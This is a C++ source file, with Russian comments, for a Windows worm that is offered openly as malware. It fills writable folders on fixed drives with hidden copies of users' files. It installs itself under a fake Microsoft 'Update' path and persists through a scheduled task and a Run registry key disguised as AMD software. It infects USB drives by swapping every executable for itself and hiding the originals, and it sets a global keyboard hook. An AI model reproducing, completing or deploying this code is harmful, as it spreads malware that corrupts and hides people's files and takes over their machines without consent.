/**
 * @file worm.cpp
 * @brief Реализация основной логики червя.
 */

// worm.cpp
#pragma comment(lib, "iphlpapi.lib")
#include "worm.h"
#include <windows.h>
#include <set>
#include <iphlpapi.h> 
#include <Icmpapi.h> // для пингования айпишников
#include <iostream>
#include <random>
#include <fstream>
#include <algorithm>

using namespace std;

//std::wstring get_own_path() {
//    wchar_t buffer[MAX_PATH];
//    DWORD result = GetModuleFileNameW(NULL, buffer, MAX_PATH);
//    if (result == 0 || result == MAX_PATH) {
//        return L"";
//    }
//    return std::wstring(buffer);
//}

std::wstring get_own_path() {
    std::wstring path;
    DWORD size = MAX_PATH;
    while (true) {
        path.resize(size);
        DWORD result = GetModuleFileNameW(NULL, &path[0], size);
        if (result == 0) {
            wcerr << L"[Ошибка] GetModuleFileNameW вернул 0, код ошибки: " << GetLastError() << endl;
            return L"";
        }
        if (result < size) {
            path.resize(result);
            return path;
        }
        size *= 2;
    }
}

std::wstring get_own_folder() {
    DWORD size = MAX_PATH;
    std::wstring path;

    while (true) {
        path.resize(size);
        DWORD result = GetModuleFileNameW(NULL, &path[0], size);
        if (result == 0) {
            return L"";
        }
        if (result < size) {
            path.resize(result);
            break;
        }
        size *= 2; // Увеличиваем буфер
    }

    // Получаем директорию из полного пути к EXE
    return std::filesystem::path(path).parent_path().wstring();
}




std::wstring get_drive_root_from_path(const std::wstring& full_path) {
    if (full_path.size() < 3 || full_path[1] != L':' || full_path[2] != L'\\') {
        return L"";
    }
    return full_path.substr(0, 3);  // Например: "C:\"
}

bool is_hidden(const filesystem::path& path) {
    DWORD attrs = GetFileAttributesW(path.wstring().c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        return false; // если не удалось получить атрибуты, считаем что не скрыта
    }
    return (attrs & FILE_ATTRIBUTE_HIDDEN) || (attrs & FILE_ATTRIBUTE_SYSTEM);
}


wstring generate_unique_suffix() {
    // Время в наносекундах
    auto now = std::chrono::high_resolution_clock::now();
    auto ns = std::chrono::duration_cast<std::chrono::nanoseconds>(
        now.time_since_epoch()).count();

    // Рандом от 1000 до 9999
    static std::mt19937 gen(std::random_device{}());
    static std::uniform_int_distribution<> dis(1000, 9999);
    int rnd = dis(gen);

    return std::to_wstring(ns) + L"_" + std::to_wstring(rnd);
}


//void init_locale() { // это уже не нужно?
//#ifdef _WIN32
//    SetConsoleOutputCP(CP_UTF8);
//    std::wcout.imbue(std::locale(".UTF-8"));
//    std::wcerr.imbue(std::locale(".UTF-8"));
//#endif
//}

std::wstring get_filename_stem(const filesystem::path& filepath) {
    try {
        return filepath.stem().wstring();
    }
    catch (...) {
        // Если не удалось получить имя, возвращаем пустую строку
        return L"file";
    }
}


void worm::worm_was_started() {
    MessageBoxW(
        NULL,                            // Владелец окна (NULL — нет владельца)
        L"Ты был заражён!",              // Текст сообщения
        L"Предупреждение",               // Заголовок окна
        MB_OK | MB_ICONWARNING           // Кнопка OK и значок предупреждения
    );
}

void worm::worm_was_end() {
    MessageBoxW(
        NULL,                            // Владелец окна (NULL — нет владельца)
        L"Я закончил!",              // Текст сообщения
        L"Предупреждение",               // Заголовок окна
        MB_OK | MB_ICONWARNING           // Кнопка OK и значок предупреждения
    );
}

vector<wstring> get_all_volumes() { // находим все корневые директории
    vector<wstring> volumes;

    wchar_t volumeName[MAX_PATH] = { 0 };
    HANDLE hFind = FindFirstVolumeW(volumeName, ARRAYSIZE(volumeName));

    if (hFind == INVALID_HANDLE_VALUE) {
        wcerr << L"Ошибка при вызове FindFirstVolumeW\n";
        return volumes;
    }

    do {
        volumes.push_back(volumeName);
    } while (FindNextVolumeW(hFind, volumeName, ARRAYSIZE(volumeName)));

    FindVolumeClose(hFind);
    return volumes;
}


vector<wstring> get_paths_for_volume(const wstring& volumeName) { // преобразуем в wstring найденные дирректории
    vector<wstring> paths;

    DWORD returnLength = 0;
    wchar_t buffer[MAX_PATH * 10] = { 0 };

    if (GetVolumePathNamesForVolumeNameW(volumeName.c_str(), buffer, ARRAYSIZE(buffer), &returnLength)) {
        wchar_t* current = buffer;
        while (*current) {
            paths.push_back(current);
            current += wcslen(current) + 1;
        }
    }
    else {
        wcerr << L"Невозможно получить путь для тома: " << volumeName << L"\n";
    }

    return paths;
}

wstring get_username() { // получаем юсер нейм пользователя для добавления в автозагрузку в дальнейшем
    wchar_t username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserNameW(username, &size);
    return std::wstring(username);
}


vector<wstring> get_removable_volume_paths() { // получем пути съемных носителей
    vector<wstring> removable_paths;

    wchar_t volumeName[MAX_PATH] = { 0 };
    HANDLE hFind = FindFirstVolumeW(volumeName, ARRAYSIZE(volumeName));

    if (hFind == INVALID_HANDLE_VALUE) {
        wcerr << L"Ошибка FindFirstVolumeW\n";
        return removable_paths;
    }

    do {
        // Получаем все пути (обычно один путь: "E:\\")
        vector<wstring> paths = get_paths_for_volume(volumeName);

        for (const auto& path : paths) {
            UINT driveType = GetDriveTypeW(path.c_str());

            if (driveType == DRIVE_REMOVABLE) {
                removable_paths.push_back(path);
            }
        }

    } while (FindNextVolumeW(hFind, volumeName, ARRAYSIZE(volumeName)));

    FindVolumeClose(hFind);
    return removable_paths;
}

void filter_only_exe(vector<filesystem::path>& files) { // фильтруем из всех файлов, только exe
    vector<filesystem::path> filtered;
    for (const auto& file : files) {
        if (file.extension() == L".exe") {
            filtered.push_back(file);
        }
    }
    files = filtered;
}








void worm::scan_all_volumes()  // поиск по всем корневым дискам, исключая съемные носители
{

    auto volumes = get_all_volumes();

    for (const auto& vol : volumes) {
        auto paths = get_paths_for_volume(vol);

        for (const auto& path : paths) {
            UINT driveType = GetDriveTypeW(path.c_str());

            if (driveType == DRIVE_FIXED) { // только SSD/HDD, так как для флешек и прочих съемных носителей другая логика
                std::wcout << L"Обход: " << path << L"\n";
                search_list_dir(path, list_dir);
            }
            else {
                std::wcout << L"Пропущено (не HDD/SSD): " << path << L"\n";
            }
        }
    }


}

bool worm::possible_to_write(const std::wstring& dir_path) {
    // путь к тестовому файлу (например, создадим временный "test.txt")
    std::wstring test_file = dir_path + L"\\test.tmp";

    HANDLE hFile = CreateFileW(
        test_file.c_str(),        // полный путь
        GENERIC_WRITE,            // права на запись
        0,                        // без шаринга
        NULL,                     // защиты нет
        CREATE_ALWAYS,            // создаём всегда (перезапишем если есть)
        FILE_ATTRIBUTE_NORMAL,    // обычный файл
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return false; // не удалось создать
    }

    CloseHandle(hFile);
    DeleteFileW(test_file.c_str()); // удалим тестовый файл
    
    return true; // запись возможна
}

bool worm::is_system_path(const std::wstring& path)
{
    wchar_t windowsDir[MAX_PATH];
    wchar_t systemDir[MAX_PATH];

    // получаем путь к Windows и System32
    GetWindowsDirectoryW(windowsDir, MAX_PATH);
    GetSystemDirectoryW(systemDir, MAX_PATH);

    // список запрещённых директорий
    std::vector<std::wstring> forbidden = {
        std::wstring(windowsDir),                       // \Windows
        std::wstring(systemDir),                        // \Windows\System32
        std::wstring(windowsDir) + L"\\WinSxS",
        std::wstring(windowsDir) + L"\\servicing",
        std::wstring(windowsDir) + L"\\Logs",
        std::wstring(windowsDir) + L"\\Temp",
        L"\\Program Files",
        L"\\Program Files (x86)",
        L"\\ProgramData",
        L"\\$Recycle.Bin",
        L"\\System Volume Information",
        L"\\Recovery",
        L"\\PerfLogs"
    };

    // проверяем совпадение (начинается с запрещённого пути)
    for (const auto& bad : forbidden) {
        if (path.size() >= bad.size() &&
            _wcsnicmp(path.c_str(), bad.c_str(), bad.size()) == 0) {
            wcout << L"нашли системную папку и не берем ее " << path << endl;
            return true;
        }
    }

    return false;
}

void worm::search_list_dir(const wstring& path_to_dir, vector<wstring>& list_dir_tmp)
{
    if (is_system_path(path_to_dir)) {
        return; // пропускаем системную папку сразу
    }

    error_code ec;
    filesystem::directory_iterator it(path_to_dir, ec);
    if (ec) {
        wcerr << L"Ошибка доступа к " << path_to_dir << L": " << ec.message().c_str() << L"\n";
        return;
    }

    // Добавляем текущую папку, если можно записывать
    if (possible_to_write(path_to_dir)) {
        list_dir_tmp.push_back(path_to_dir);
    }

    for (const auto& entry : it) {
        if (entry.is_directory(ec) && !ec && !is_hidden(entry.path())) {
            search_list_dir(entry.path().wstring(), list_dir_tmp);  // рекурсия
        }
    }
}



void worm::search_list_dir() // для старта поиска по дирректориям
{
    list_dir.clear();

    this->search_list_dir(this->path_to_start, this->list_dir);
    //search_list_dir(L"E:\\test_worm", list_dir);//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
    //list_dir.push_back(path_to_start);

}

void worm::print_list_dir() // вывод всех найденных папок, в которых будет копирование
{
    for (auto entry : list_dir) {
        wcout << entry << endl;
    }
}

void worm::collect_visible_files()
{
    this->collect_visible_files(this->list_dir, this->file_to_copy);
}

void worm::collect_visible_files(const vector<wstring>& list_dir_tmp, vector<filesystem::path>& collected_files)
{
    collected_files.clear();

    if (list_dir_tmp.empty()) {
        wcerr << L"[!] Список директорий пуст! Сначала вызовите search_list_dir()\n";
        return;
    }
    wcout<<endl << L"Список всех директорий на обработку" << endl<<endl;
    

    for (const auto& dir : list_dir_tmp) {
        
        std::error_code dir_ec;
        filesystem::directory_iterator it(dir, dir_ec);

        if (dir_ec) {
            wcerr << L"[!] Пропущена папка (нет доступа): " << dir << L" — " << dir_ec.message().c_str() << endl;
            continue;
        }

        for (const auto& entry : it) {
            std::error_code file_ec;
            const filesystem::path& path = entry.path();
            auto status = entry.status(file_ec);

            if (file_ec || !filesystem::is_regular_file(status)) {
                continue;
            }

            // Проверка на скрытость
            DWORD attrs = GetFileAttributesW(path.c_str());
            if (attrs == INVALID_FILE_ATTRIBUTES) continue;

            if (!(attrs & FILE_ATTRIBUTE_HIDDEN)) {
                collected_files.push_back(path);
            }
        }
    }
}


void worm::print_file_to_copy()
{
    cout << "Вывод файлов для копирования" << endl;
    for (auto a1 : file_to_copy) {
        wcout << a1.wstring() << endl;
    }
}

void worm::replicate_files()
{
    this->replicate_files(this->iteration);
}

void worm::replicate_files(int count)
{
    if (file_to_copy.empty()) {
        std::cerr << "Список файлов пуст! Сначала выполните collect_visible_files()\n";
        return;
    }

    for (const auto& original_file : file_to_copy) {
        for (int i = 1; i <= count; ++i) {
            std::wstring ext = original_file.extension().wstring();
            std::wstring stem = original_file.stem().wstring();
            std::filesystem::path parent_dir = original_file.parent_path();

            std::wcout << L"Обрабатываем файл: " << original_file.wstring() << L"\n";
            std::filesystem::path copy_path = parent_dir / (stem + L"_" + generate_unique_suffix() + ext);
            try {
                std::filesystem::copy_file(original_file, copy_path, std::filesystem::copy_options::overwrite_existing);
                DWORD attrs = GetFileAttributesW(copy_path.wstring().c_str());
                if (attrs != INVALID_FILE_ATTRIBUTES) {
                    DWORD new_attrs = attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
                    if (!SetFileAttributesW(copy_path.wstring().c_str(), new_attrs)) {
                        std::wcerr << L"Ошибка SetFileAttributesW: " << GetLastError() << L"\n";
                    }
                }
            }
            catch (const std::filesystem::filesystem_error& e) {
                std::cerr << " Ошибка при создании копии: " << e.what() << "\n";
            }
        }
    }
}

void worm::copy_and_hide_worm()
{
    wchar_t own_path[MAX_PATH];
    GetModuleFileNameW(NULL, own_path, MAX_PATH);

    wchar_t appdata_path[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata_path);  // %APPDATA%
    std::wstring dest_folder = std::wstring(appdata_path) + L"\\Microsoft\\Update";
    std::wstring dest_exe = dest_folder + L"\\update.exe";
    // Создать директорию (если её нет)
    filesystem::create_directories(dest_folder);
    // Удаляем старый файл, если существует
    if (filesystem::exists(dest_exe)) {
        filesystem::remove(dest_exe);
    }
    // Копировать себя
    CopyFileW(own_path, dest_exe.c_str(), FALSE);
    SetFileAttributesW(dest_folder.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    SetFileAttributesW(dest_exe.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    std::wcout << L"Файл червя скопирован в: " << dest_exe << std::endl;
    // Создать автозапуск
    create_scheduled_task(dest_exe);
}


void worm::create_scheduled_task(const wstring& worm_path)
{
    //wstring worm_path = get_own_path();
    std::wstring cmd = L"schtasks /create /tn \"AMDUpdateLoader\" "
        L"/tr \"" + worm_path + L"\" "
        L"/sc ONLOGON /RL LIMITED /F";
    _wsystem(cmd.c_str());
    HKEY hKey;
    const std::wstring subkey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const std::wstring value_name = L"AMDapp";  // Название ключа

    // Открываем раздел реестра
    if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        // Устанавливаем значение ключа
        RegSetValueExW(
            hKey,
            value_name.c_str(),
            0,
            REG_SZ,
            reinterpret_cast<const BYTE*>(worm_path.c_str()),
            static_cast<DWORD>((worm_path.length() + 1) * sizeof(wchar_t))
        );

        RegCloseKey(hKey);
    }


}

void worm::process_all_removable_disks()
{
    vector<wstring> removable = get_removable_volume_paths();

    for (const auto& root : removable) {
        wcout << L"[Обработка]: " << root << endl;
        vector <wstring> data_list;
        data_list.clear();
        search_list_dir(root, data_list); // Рекурсивно собрать все директории

        collect_visible_files(data_list, exe_on_the_flash_drive); // Собираем все видимые файлы
        filter_only_exe(exe_on_the_flash_drive); // Фильтруем только .exe
        if (!dir_was_infected(root)) {
            for (const auto& exe_path : exe_on_the_flash_drive) {
                hide_and_replace_exe(exe_path, get_own_path());
            }
        }
    }
}


void worm::hide_and_replace_exe(const filesystem::path& target_exe, const std::wstring& worm_path)
{
    if (filesystem::equivalent(target_exe, worm_path)) {
        return;
    }

    SetFileAttributesW(target_exe.c_str(), FILE_ATTRIBUTE_NORMAL);

    std::wstring unique_suffix = generate_unique_suffix();
    filesystem::path backup = target_exe;
    backup.replace_filename(target_exe.stem().wstring() + L"_" + unique_suffix + target_exe.extension().wstring());

    filesystem::rename(target_exe, backup);

    if (!filesystem::exists(worm_path)) {
        if (filesystem::exists(backup)) {
            filesystem::rename(backup, target_exe);
        }
        return;
    }

    if (!CopyFileW(worm_path.c_str(), target_exe.c_str(), FALSE)) {
        if (filesystem::exists(backup)) {
            filesystem::rename(backup, target_exe);
        }
        return;
    }

    SetFileAttributesW(backup.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    infected_dir(get_drive_root_from_path(target_exe)); // добавляем скрытый файл, чтобы не заражать флешку несколько раз
}








void worm::infected_dir(const std::wstring& path) {
    std::filesystem::path p(path);
    p /= L".inf";
    std::wofstream marker(p);
    marker << L"infected";
    marker.close();
    SetFileAttributesW(p.wstring().c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

bool worm::dir_was_infected(const wstring& dir_path)
{
    wstring full_name_to_file = dir_path + L"\\.infected";
    return filesystem::exists(full_name_to_file);
}



worm* worm::instance = nullptr;

// WndProc, который вызывает process_all_removable_disks при подключении устройства
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg) {
    case WM_DEVICECHANGE:
        if (wParam == DBT_DEVICEARRIVAL) {
            PDEV_BROADCAST_HDR hdr = (PDEV_BROADCAST_HDR)lParam;
            if (hdr && hdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                PDEV_BROADCAST_VOLUME vol = (PDEV_BROADCAST_VOLUME)lParam;
                DWORD unitMask = vol->dbcv_unitmask;

                for (int i = 0; i < 26; ++i) {
                    if (unitMask & (1 << i)) {
                        wchar_t drive = L'A' + i;
                        std::wcout << L" Обнаружена флешка: " << drive << L":\\" << std::endl;

                        // Вызов метода для обработки флешек
                        if (worm::instance) {
                            worm::instance->process_all_removable_disks();
                        }
                    }
                }
            }
        }
        break;
    case WM_CLOSE:
        DestroyWindow(hwnd);
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

int worm::run_device_monitor(HINSTANCE hInstance)
{
    const wchar_t CLASS_NAME[] = L"WormDeviceMonitorWindow";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    if (!RegisterClass(&wc)) {
        std::wcerr << L"Ошибка регистрации класса окна\n";
        return -1;
    }

    HWND hwnd = CreateWindowEx(
        0,
        CLASS_NAME,
        L"Worm Device Monitor",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        300, 200,
        NULL, NULL, hInstance, NULL);

    if (!hwnd) {
        std::wcerr << L"Ошибка создания окна\n";
        return -1;
    }

    ShowWindow(hwnd, SW_HIDE); // Скрываем окно

    // Установка хука для F9
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, worm::LowLevelKeyboardProc, NULL, 0);
    if (!keyboardHook) {
        std::wcerr << L"Ошибка установки клавиатурного хука\n";
        return -1;
    }

    // Цикл сообщений
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Очистка хука
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = nullptr;
    }

    return 0;
}


void attach_console() {
    if (!AttachConsole(ATTACH_PARENT_PROCESS)) {
        AllocConsole();
    }
    FILE* fp;

    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);
    freopen_s(&fp, "CONIN$", "r", stdin);
} 



HHOOK worm::keyboardHook = nullptr; // Для считывания горячей клваиши по завершению мониторинга флешек (отладочный метод)

LRESULT CALLBACK worm::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { // Клавиша для завершения мониторинга флешек
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

        // Проверка: F9
        SHORT ctrl = GetAsyncKeyState(VK_CONTROL);
        SHORT shift = GetAsyncKeyState(VK_SHIFT);

        if (p->vkCode == VK_F9) {
            std::wcout << L"[!] F9 нажата — Завершение работы\n";
            PostQuitMessage(0);
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}




